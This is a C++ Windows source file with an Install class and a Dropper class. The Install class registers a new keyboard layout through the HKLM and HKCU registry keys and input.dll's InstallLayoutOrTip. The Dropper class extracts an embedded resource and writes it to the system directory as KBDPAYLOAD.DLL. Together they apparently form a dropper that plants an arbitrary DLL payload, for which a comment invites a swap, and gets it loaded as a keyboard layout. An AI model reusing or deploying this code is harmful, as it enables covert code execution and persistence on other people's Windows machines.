#pragma once
#include "install.hpp"
#include <string>
#include "strsafe.h"
#pragma warning(disable : 4267)
#include "resource1.h"

//You can call either InstallLayoutOption2 or AddLayoutToLanguageBar.
//AddLayoutToLanguageBar is method 1: for only current user.
//InstallLayoutOption2 is for all users.

bool Install::InstallLayoutOption2(PLAYOUTID klid) noexcept
{
	bool bSucess = false;
	wchar_t inputSubkey[32];
	wchar_t subkey[10];

	HMODULE hModInput = LoadLibraryW(L"input.dll");
	if (!hModInput){
		return false;
	}
	pfnInstallLayoutOrTip pInstallFunc = reinterpret_cast<pfnInstallLayoutOrTip>(GetProcAddress(hModInput, "InstallLayoutOrTip"));
	if (SUCCEEDED(StringCchPrintfW(inputSubkey, 31, L"%04x", klid->m_maxLayoutId))
		&& SUCCEEDED(StringCchCatW(inputSubkey, 31, L":"))
		&& SUCCEEDED(StringCchPrintfW(subkey, 9, L"%08x", klid->m_maxLayoutId))
		&& SUCCEEDED(StringCchCatW(inputSubkey, 31, subkey))
		)
	{
		std::wprintf(L"Full inputSubkey is: %s\n", inputSubkey);
		pInstallFunc(inputSubkey, 0);
		bSucess = true;
	}
	FreeLibrary(hModInput);
	return bSucess;
}

bool Install::AddLayoutToLanguageBar(PLAYOUTID klid) noexcept
{
	bool bSucess = false;
	DWORD i = 0, dwLengthValues = 0;
	HKEY hLocalUser; 
	if (!RegOpenKeyA(HKEY_CURRENT_USER, "Keyboard Layout\\Preload", &hLocalUser))
	{
		if (!RegQueryInfoKey(hLocalUser, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, &dwLengthValues,
			nullptr, nullptr, nullptr, nullptr))
		{
			constexpr uint32_t sizeKey = 10, sizeMaxIndex = 5;
			CHAR subkey[sizeKey];
			if (FAILED(StringCchPrintfA(subkey , sizeKey - 1, "%08x", klid->m_maxLayoutId))){
				printf("Could not printf subkey value for storage.");
				RegCloseKey(hLocalUser);
				return bSucess;
			}
			//For this case, we know preload indexes start from 1, se we just add 1 to the length of values and add our keyboard layout id.
			if (!RegSetKeyValueA(hLocalUser, NULL, std::to_string(dwLengthValues + 1).c_str(), REG_SZ, 
				subkey, sizeof(subkey))){
				bSucess = true;
			}
		}
		RegCloseKey(hLocalUser);
	}
	return bSucess;
}

auto Install::Transform(PWCHAR orgSubKeyName) noexcept
{
	wchar_t chrSubkey, chr, *j;
	UINT i;

	j = orgSubKeyName;
	chrSubkey = *orgSubKeyName;
	for (i = 0; *j; chrSubkey = *j)
	{
		++j;
		if ((chrSubkey - 0x41) > 5u)
		{
			if ((chrSubkey - 0x30) > 9u)
			{
				if ((chrSubkey - 0x61) > 5u)
					return i;
				chr = chrSubkey - 87;
			}
			else
			{
				chr = chrSubkey - 0x30;
			}
		}
		else
		{
			chr = chrSubkey - 55;
		}
		i = chr + 16 * i;
	}
	//Additional number added for the new layout ID, you can change this if you want.
	return i + 0xC;
}

auto Install::GetMaxAvailableID(const HKEY& hKey, PLAYOUTID LayoutStruct) -> bool
{
	DWORD i = 0, dwIdTemp = 0, dwSubKeysCount = 0, dwMaxLenSubKeys = 0, dwCountName = 0;
	WCHAR subKeyName[MAX_PATH] = { };
	FILETIME ft;

	//This will help for the other case, getting all the values from the subkeys!
	if (::RegQueryInfoKey(hKey, nullptr, nullptr, nullptr, &dwSubKeysCount, &dwMaxLenSubKeys, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr)) {
		std::cerr << "Could not query information for the key, last error is: " << GetLastError() << "\n";
	}
	for (UINT i = 0; i < dwSubKeysCount; i++) {
		dwCountName = 260;
		//Does it return a string
		auto errorCode = ::RegEnumKeyEx(hKey, i, subKeyName, &dwCountName, 0, 0, 0, &ft);
#ifdef _DEBUG
		//Prints one more before ending the loop
		std::wprintf(L"(%d) %s\n", i + 1, subKeyName);
#endif
		if (i == dwSubKeysCount - 1) {
			//This will transform from wide string to DWORD.
			dwIdTemp = Transform(subKeyName);
#ifdef _DEBUG
			std::wprintf(L"Last transformed key: (%d) %s\n", i + 1, subKeyName);
#endif 
		}
	}
	LayoutStruct->m_maxLayoutId = dwIdTemp;
	return true;
}

bool Install::SetRegValuesHKLM(const HKEY& hSubKey, PLAYOUTID pLayoutStruct)
{
	if (
		SetRegistryValue(hSubKey, L"Layout Text", LAYOUT_OPTION::LAYOUT_TEXT)
		|| SetRegistryValue(hSubKey, L"Layout Id", LAYOUT_OPTION::LAYOUT_ID)
		|| SetRegistryValue(hSubKey, L"Layout File", LAYOUT_OPTION::LAYOUT_FILE)
		|| SetRegistryValue(hSubKey, L"Layout Display Name", LAYOUT_OPTION::LAYOUT_DISPLAY_NAME)
	)
	{
		std::cerr << "Could not set values of all values, last error: " << GetLastError() << "\n";
		return false;
	}
	return true;
}

bool Install::CreateValuesSubkey(const HKEY& hKey, PLAYOUTID playoutStruct) 
{
	DWORD dwDisposition; 
	constexpr uint32_t dwSize = 10, dwSizeLayout = 6;
	wchar_t subkey[dwSize], firstLayoutId[dwSizeLayout];
	HKEY hSubKey = NULL;

	if (FAILED(StringCchPrintfW(subkey, dwSize - 1, L"%08x", playoutStruct->m_maxLayoutId))){
		std::wprintf(L"Could not initialize print of subkey value for maxLayoutID\n");
		return false;
	}
	if (FAILED(StringCchPrintfW(firstLayoutId, dwSizeLayout - 1, L"%04x", playoutStruct->m_firstAvailableLayout))){
		std::wprintf(L"Could not initialize print of first available ID value\n");
		return false;
	}

	if (RegCreateKeyExW(hKey, subkey, 0, 0, 0, KEY_CUSTOM_ACCESS, 0, &hSubKey, &dwDisposition)) {
		std::wprintf(L"Could not create HANDLE for subkey %s, last error is: %d\n", subkey, GetLastError());
		return false;
	}
	if (!SetRegValuesHKLM(hSubKey, playoutStruct)){
		RegCloseKey(hSubKey);
		std::wprintf(L"Could not create values for %s.\n", subkey);
		return false;
	}
	RegCloseKey(hSubKey);
	return true;
}

auto Install::InstallCustomLayout(PLAYOUTID playoutStruct) -> bool 
{
	HKEY hLocalMachine;
	bool retVal = false;
	if (!RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts", 0, KEY_CUSTOM_ACCESS, &hLocalMachine))
	{
		if (GetMaxAvailableID(hLocalMachine, playoutStruct) 
			&& CreateValuesSubkey(hLocalMachine, playoutStruct)
			//&& AddLayoutToLanguageBar(playoutStruct)
			&& InstallLayoutOption2(playoutStruct)
			)
		{
			retVal = true;
		}
		RegCloseKey(hLocalMachine);
	}
	return retVal;
}

bool Dropper::DropDllPayload(void) noexcept
{
	HMODULE hMod = GetModuleHandleA(NULL);
	HRSRC hResource = FindResource(hMod, MAKEINTRESOURCE(IDR_RT_RCDATA1), L"RT_RCDATA");
	if (hResource == NULL)
	{
		printf("Could not find the payload dll resource, exiting...\n");
		return false;
	}		
	DWORD dwSizeResource = SizeofResource(hMod, hResource);
	HGLOBAL hResLoaded = LoadResource(hMod, hResource);
	if (hResLoaded == NULL)
	{
		printf("Could not find the dll layout, exiting...\n");
		return false;
	}
	auto pBuffer = static_cast<BYTE*> (LockResource(hResLoaded));
	LPSTR pathPayload = new char[MAX_PATH];
	if (pathPayload == NULL)
	{
		printf("Could not allocate memory for pathPayload, exiting...\n");
		return false;
	}
	
	GetSystemDirectoryA(pathPayload, MAX_PATH);

	//Here the path is hardcoded but you can use your own DLL payload.
	strcat_s(pathPayload, MAX_PATH, "\\KBDPAYLOAD.DLL");
	HANDLE hFile = CreateFileA(pathPayload, GENERIC_ALL, FILE_SHARE_DELETE,
		NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
	delete[] pathPayload;
	if (hFile == INVALID_HANDLE_VALUE)
	{
		std::printf("Could not obtain HANDLE to the newly created FILE, last error is %d\n", GetLastError());
		return false;
	}
	DWORD dwNumberBytesWritten;
	if (!WriteFile(hFile, pBuffer, dwSizeResource, &dwNumberBytesWritten, nullptr))
	{
		std::printf("Could not write to file, last error is %d\n", GetLastError());
		CloseHandle(hFile);
		return false;
	}
	CloseHandle(hFile);
	return true;
}
